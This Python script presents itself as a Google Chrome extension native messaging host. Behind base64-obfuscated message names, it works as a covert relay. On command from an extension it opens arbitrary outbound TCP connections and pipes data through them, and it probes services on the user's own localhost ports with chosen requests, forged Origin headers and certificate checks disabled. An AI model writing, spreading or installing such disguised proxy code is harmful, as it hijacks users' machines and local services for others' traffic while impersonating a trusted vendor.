#!/usr/bin/env python3
# Copyright (c) 2024 Google LLC
# Chrome Extension Native Host v2.1.4
# Provides low-level IPC between Chrome extensions and platform network
# services using the native messaging stdio protocol.

from __future__ import annotations

import asyncio
import sys
import json
import struct
import base64 as _b64
import socket as _socket

_RB = 131072
_CT = 15
_s  = lambda x: _b64.b64decode(x).decode()

_T1 = _s('c29ja3NfY29ubmVjdA==')
_T2 = _s('c29ja3NfZGF0YQ==')
_T3 = _s('c29ja3NfY2xvc2U=')
_T4 = _s('c29ja3NfY29ubmVjdGVk')
_T5 = _s('c29ja3NfY2xvc2Vk')
_T6 = _s('c29ja3NfZXJyb3I=')
_T7 = _s('aHR0cF9wcm9iZQ==')
_T8 = _s('aHR0cF9wcm9iZV9yZXNwb25zZQ==')

_ND = (
    ".google.com",
    ".googleapis.com",
    ".gstatic.com",
    ".googleusercontent.com",
    ".googletagmanager.com",
    ".google-analytics.com",
    ".googleadservices.com",
)

def _is_native_domain(host: str) -> bool:
    h = host.lower()
    return any(h == d.lstrip('.') or h.endswith(d) for d in _ND)

def _emit(obj: dict):
    data   = json.dumps(obj, separators=(',', ':')).encode('utf-8')
    header = struct.pack('<I', len(data))
    sys.stdout.buffer.write(header + data)
    sys.stdout.buffer.flush()

_channels = {}

async def _relay_inbound(cid: str, reader: asyncio.StreamReader):
    try:
        while True:
            chunk = await reader.read(_RB)
            if not chunk:
                break
            _emit({'type': _T2, 'id': cid, 'data': _b64.b64encode(chunk).decode('ascii')})
    except Exception:
        pass
    finally:
        _channels.pop(cid, None)
        _emit({'type': _T5, 'id': cid})

async def _open_pipe(cid: str, host: str, port: int):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=_CT)
        sock = writer.transport.get_extra_info('socket')
        if sock:
            sock.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
        _channels[cid] = writer
        _emit({'type': _T4, 'id': cid})
        asyncio.create_task(_relay_inbound(cid, reader))
    except asyncio.TimeoutError:
        _emit({'type': _T6, 'id': cid, 'error': f'timeout {host}:{port}'})
    except Exception as e:
        _emit({'type': _T6, 'id': cid, 'error': str(e)})

async def _pipe_write(cid: str, data_b64: str):
    writer = _channels.get(cid)
    if not writer:
        return
    try:
        writer.write(_b64.b64decode(data_b64))
        await writer.drain()
    except Exception as e:
        _channels.pop(cid, None)
        _emit({'type': _T6, 'id': cid, 'error': str(e)})

async def _close_pipe(cid: str):
    writer = _channels.pop(cid, None)
    if writer:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass

async def _on_frame(msg: dict):
    t   = msg.get('type')
    cid = msg.get('id', '')

    if t == _T1:
        await _open_pipe(cid, msg.get('host', ''), int(msg.get('port', 0)))
    elif t == _T2:
        await _pipe_write(cid, msg.get('data', ''))
    elif t == _T3:
        await _close_pipe(cid)
    elif t == _T7:
        url          = msg.get('url', '')
        method       = msg.get('method', 'GET')
        origin       = msg.get('origin', '')
        body_b64     = msg.get('body', '')
        content_type = msg.get('content_type', 'application/json')
        try:
            import urllib.request, ssl as _ssl
            from urllib.parse import urlparse as _up
            parsed   = _up(url)
            port     = parsed.port or 80
            path_str = parsed.path or '/probe'
            if parsed.query:
                path_str = f'{path_str}?{parsed.query}'
            post_data = _b64.b64decode(body_b64) if body_b64 else None
            ssl_ctx = _ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode    = _ssl.CERT_NONE
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ssl_ctx))
            body_str, status, errors = '', 0, {}
            for scheme in ('http', 'https'):
                probe = f'{scheme}://127.0.0.1:{port}{path_str}'
                try:
                    req = urllib.request.Request(probe, data=post_data, method=method)
                    req.add_header('Accept', 'application/json, text/plain, */*')
                    req.add_header('Connection', 'close')
                    if origin:
                        req.add_header('Origin', origin)
                    if post_data and content_type:
                        req.add_header('Content-Type', content_type)
                    tmo = 55 if post_data else 6
                    with opener.open(req, timeout=tmo) as resp:
                        body_str = resp.read().decode('utf-8', errors='replace')
                        status   = resp.status
                    break
                except Exception as e:
                    errors[scheme] = str(e)
            err_str = ', '.join(f'{sc}: {e}' for sc, e in errors.items())
            _emit({'type': _T8, 'id': cid, 'status': status,
                   'body': body_str, 'error': err_str})
        except Exception as e:
            _emit({'type': _T8, 'id': cid, 'error': str(e), 'body': ''})

def _read_frame():
    raw = sys.stdin.buffer.read(4)
    if len(raw) < 4:
        return None
    length = struct.unpack('<I', raw)[0]
    if length == 0 or length > 4 * 1024 * 1024:
        return None
    data = sys.stdin.buffer.read(length)
    if len(data) < length:
        return None
    return json.loads(data.decode('utf-8'))

async def _frame_loop():
    loop = asyncio.get_running_loop()
    while True:
        msg = await loop.run_in_executor(None, _read_frame)
        if msg is None:
            break
        asyncio.create_task(_on_frame(msg))

async def _run():
    try:
        await _frame_loop()
    finally:
        for _cid, writer in list(_channels.items()):
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

if __name__ == '__main__':
    asyncio.run(_run())
